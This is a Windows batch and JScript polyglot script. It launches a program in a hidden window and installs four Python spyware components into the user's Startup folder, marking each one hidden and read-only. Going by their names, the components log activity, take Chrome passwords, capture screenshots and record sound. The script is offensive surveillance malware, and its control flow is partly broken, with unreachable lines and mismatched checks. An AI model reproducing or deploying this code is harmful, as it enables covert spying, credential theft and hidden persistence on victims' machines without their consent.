@if (true == false) @end /*
@echo off
set "SYSDIR=SysWOW64"
if "%PROCESSOR_ARCHITECTURE%" == "x86" if not defined PROCESSOR_ARCHITEW6432 set "SYSDIR=System32"
"%WINDIR%\%SYSDIR%\cscript.exe" //nologo //e:javascript "%~f0" %*
goto :EOF */

(function(readFile, code)
{
    var e;
    try {
        var vb = new ActiveXObject('MSScriptControl.ScriptControl');
        vb.Language = 'VBScript';
        vb.AddObject('WScript', WScript, true);
        vb.AddCode(code);
    } catch(e) {
        var file = readFile();
        var prologLen = file.slice(0, file.indexOf(code)).split('\n').length;
        var vbe = vb.Error;
        WScript.Echo(
            WScript.ScriptFullName + 
            '(' + ( prologLen + vbe.Line - 1 ) + ', ' + vbe.Column + ') ' + 
            vbe.Source + ': ' + vbe.Description);
    }
})(
function()
{
    var fso = new ActiveXObject('Scripting.FileSystemObject');
    var f = fso.OpenTextFile(WScript.ScriptFullName, 1, true);
    var file = f.ReadAll();
    f.Close();
    return file;
}, 
(function()
{
    return arguments.callee.toString().replace(/^[\s\S]+\/\*|\*\/[\s\S]+$/g, '');
/* ' VBScript

Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run """" & WScript.Arguments(0) & """" & sargs, 0, False

*/
})());

:checkpython
reg query "hkcu\software\Python 2.6"  
if ERRORLEVEL 1 GOTO NOPYTHON  
goto :YESPYTHON  
:NOPYTHON  
ActivePython-2.6.4.8-win64-x86.msi  

:checkspiesready
if exist "C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\pyspy.pyw
" if exist "C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\googlepasstake.pyw" if exist "C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\screencap.pyw" if exist "C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\soundrecord.pyw" goto yesspies else goto copystartup
:copystartup
goto pythonspyautomate
timeout 4 >NUL
goto pythonchromepasshookautomate
timeout 4 >NUL
goto screenshotautomate
:yesspies
exit

:YESPYTHON  
reg query "hklm\SOFTWARE\ActiveState\ActivePerl\" 1>>Output_%date%_%time%.log 2>&1  

:pythonspyautomate
C:
cd "Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy pyspy.pyw "C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
attrib +h +r C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\pyspy.pyw

:pythonchromepasshookautomate
C:
cd "Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy googlepasstake.pyw "C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
attrib +h +r C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\googlepasstake.pyw

:screenshotautomate
C:
cd "Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy screencap.pyw "C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
attrib +h +r C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\screencap.pyw

:soundrecordautomate
C:
cd "Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy soundrecord.pyw "C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
attrib +h +r C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\soundrecord.pyw



